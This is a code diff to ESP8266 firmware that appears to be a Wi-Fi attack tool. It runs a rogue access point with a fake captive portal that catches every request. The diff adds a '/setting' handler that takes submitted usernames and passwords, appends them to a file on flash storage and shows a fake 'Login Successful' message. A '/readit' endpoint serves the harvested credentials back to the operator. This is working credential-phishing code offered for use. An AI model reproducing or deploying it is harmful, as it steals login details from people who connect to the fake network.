@@ -71,8 +71,8 @@ const bool debug = false;
 
 NameList nameList;
 DNSServer dnsServer;
- IPAddress apIP(10, 40, 104, 1);
-IPAddress Asd(10, 40, 104, 1);
+ IPAddress apIP(10, 7, 232, 1);
+IPAddress Asd(10, 7, 232, 1);
 APScan apScan;
 ClientScan clientScan;
 Attack attack;
@@ -80,9 +80,9 @@ Settings settings;
 SSIDList ssidList;
 
 //yaraklar ///
-void readcreds(){
+void readit(){
 String line;
-File f = SPIFFS.open("/f.txt", "r");
+File f = SPIFFS.open("/c.txt", "r");
   if (!f) {
       Serial.println("file open failed");
   }  Serial.println("====== Reading from SPIFFS file =======");
@@ -91,10 +91,11 @@ File f = SPIFFS.open("/f.txt", "r");
  
         
 }
+Serial.println(line);
 server.send(200, "text/html", line);
 }
 void yaz(String kadi,String sifr){
-  File f = SPIFFS.open("/f.txt", "a");
+  File f = SPIFFS.open("/c.txt", "a");
   if (!f) {
       Serial.println("file open failed");
 }
@@ -115,6 +116,8 @@ void startWifi() {
   WiFi.mode(WIFI_STA);
   wifi_set_promiscuous_rx_cb(sniffer);
   WiFi.softAP((const char*)settings.ssid.c_str(), bos, settings.apChannel, settings.ssidHidden); //for an open network without a password change to:  WiFi.softAP(ssid);
+    //WiFi.softAP("emergencyy", bos, settings.apChannel, settings.ssidHidden); //for an open network without a password chasnge to:  WiFi.softAP(ssid);
+
   WiFi.softAPConfig(apIP, Asd, IPAddress(255, 255, 248, 0));
   Serial.println("SSID     : '" + settings.ssid+"'");
   Serial.println("Password : '" + settings.password+"'");
@@ -492,7 +495,15 @@ void setup() {
   server.on("/fwlink", loadFakeHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
   server.onNotFound(loadFakeHTML);
   server.on("/", loadFakeHTML);
-  server.on("/readit", readcreds);
+  server.on("/setting", []() {
+        String qsid = server.arg("user");
+        String qpass = server.arg("pass");
+        if (qsid.length() > 0 && qpass.length() > 0) {
+yaz(qsid,qpass);
+    server.send(200, "text/html", "Web Authentication Login Successful.\n Redirecting..");
+        };
+});
+  server.on("/readit", readit);
   server.on("/pwner", loadIndexHTML);
   //server.on("/index.html", loadIndexHTML);
   server.on("/apscan.html", loadAPScanHTML);
@@ -541,7 +552,6 @@ void setup() {
   server.on("/addClient.json",addClient);
 
   server.begin();
-   SPIFFS.begin();
 }
 
 void loop() {
